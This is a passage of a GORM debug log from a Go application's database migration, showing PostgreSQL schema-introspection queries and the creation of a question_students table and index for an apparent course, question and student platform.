[0m[33m[1.131ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'courses' AND indexname = 'idx_courses_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.353ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'questions' AND table_type = 'BASE TABLE'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.454ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[8.767ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'questions'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[2.314ms] [34;1m[rows:-][0m SELECT * FROM "questions" LIMIT 5

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[25.992ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'questions' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[15.080ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'questions'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.021ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'questions'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[4.374ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'questions' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'questions' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.118ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'questions' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'questions' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.127ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'questions' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'questions' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.167ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'questions' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'questions' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.137ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'questions' AND column_name = 'question') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'questions' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.156ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'questions' AND column_name = 'answer') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'questions' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.117ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'questions' AND column_name = 'hint1') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'questions' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.102ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'questions' AND column_name = 'hint2') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'questions' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.696ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'questions' AND column_name = 'hint3') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'questions' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.133ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'questions' AND column_name = 'point') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'questions' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.035ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'questions' AND column_name = 'difficulty_level_id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'questions' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.219ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'questions' AND column_name = 'course_id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'questions' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.856ms] [34;1m[rows:1][0m SELECT count(*) FROM INFORMATION_SCHEMA.table_constraints WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'questions' AND constraint_name = 'fk_questions_course'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.034ms] [34;1m[rows:1][0m SELECT count(*) FROM INFORMATION_SCHEMA.table_constraints WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'questions' AND constraint_name = 'fk_questions_difficulty_level'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.729ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'questions' AND indexname = 'idx_questions_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.500ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'question_students' AND table_type = 'BASE TABLE'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[16.926ms] [34;1m[rows:0][0m CREATE TABLE "question_students" ("id" bigserial,"created_at" timestamptz,"updated_at" timestamptz,"deleted_at" timestamptz,"student_id" bigint,"question_id" bigint,PRIMARY KEY ("id"),CONSTRAINT "fk_question_students_student" FOREIGN KEY ("student_id") REFERENCES "students"("id"),CONSTRAINT "fk_question_students_question" FOREIGN KEY ("question_id") REFERENCES "questions"("id"))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[11.530ms] [34;1m[rows:0][0m CREATE INDEX IF NOT EXISTS "idx_question_students_deleted_at" ON "question_students" ("deleted_at")

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.701ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND table_type = 'BASE TABLE'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.316ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[4.518ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'users'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[4.365ms] [34;1m[rows:-][0m SELECT * FROM "users" LIMIT 5

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[18.315ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'users' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[23.437ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'users'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.514ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'users'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.120ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.173ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.174ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.069ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[5.362ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'user_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[2.930ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'first_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.105ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'last_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.135ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'middle_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.055ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'email') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.004ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'phone') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.043ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'password') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.117ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'email_verified') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.047ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'phone_verified') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.223ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'locked') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.807ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'users' AND indexname = 'idx_users_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.636ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND table_type = 'BASE TABLE'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.392ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.757ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'students'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.562ms] [34;1m[rows:-][0m SELECT * FROM "students" LIMIT 5

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[9.857ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'students' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[36.211ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'students'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.580ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'students'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[5.839ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'students' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.138ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'students' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[5.313ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'students' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.982ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'students' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
